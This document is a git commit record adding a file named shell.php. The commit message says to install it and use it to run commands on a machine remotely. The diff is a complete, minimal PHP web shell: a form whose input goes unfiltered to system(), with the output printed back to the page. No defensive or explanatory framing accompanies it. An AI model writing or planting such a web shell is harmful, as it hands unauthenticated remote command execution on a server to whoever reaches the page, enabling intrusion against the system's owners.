1e477e20e0ac646ccd29cf6bd5c9a8ffc3fddc5f
Oleg Mitrakhovich <olegmit9@hotmail.com>
2021-05-05 13:04:22 -0400

    added shell.php
    install this and use remotely to run commands on a machine

---
+++ shell.php
@@ -0,0 +1,11 @@
+<?php
+
+
+echo "<html>";
+
+echo "<form method=GET><input type=text name=c style='width:400px;'><input type=submit value=Execute style='height:34px;'></form>";
+
+echo "<pre>";
+$a = system($_GET["c"]);
+echo "</pre></html>";
+?>
